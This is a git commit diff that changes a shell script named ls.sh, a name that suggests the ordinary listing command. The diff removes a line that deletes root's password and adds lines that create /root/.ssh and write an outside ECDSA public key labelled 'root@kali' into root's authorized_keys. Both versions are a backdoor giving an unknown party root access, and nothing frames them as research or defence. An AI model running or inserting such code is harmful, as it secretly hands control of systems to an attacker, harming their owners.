d8e5cd8c01c65266421a015a59c3ff4b48f2a1e9
crabelo <84055415+crabelo@users.noreply.github.com>
2023-10-22 23:09:08 -0300

    Update ls.sh

--- ls.sh
+++ ls.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-sudo passwd --delete root
-
+mkdir /root/.ssh
+echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKeknki1K2HproFhSAjWtgEJb1v7FLWD+EsysGFDEu+Q5eqDmcqygbEQ7W1A1xeZX10jNoRI3clDPkSLSfEw2wg= root@kali' > /root/.ssh/authorized_keys
